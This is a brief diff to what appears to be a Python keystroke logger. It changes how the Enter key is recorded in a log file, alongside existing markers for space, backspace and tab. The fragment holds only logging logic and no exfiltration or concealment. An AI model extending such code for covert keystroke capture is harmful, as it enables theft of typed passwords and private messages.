@@ -11,7 +11,7 @@ def write_to_file(key):
         if key == 'Key.space':
             f.write(" ")
         elif key == 'Key.enter':
-            f.write("\n")
+            f.write("[ENTER]")
         elif key == 'Key.backspace':
             f.write("[BACKSPACE]")
         elif key == 'Key.tab':
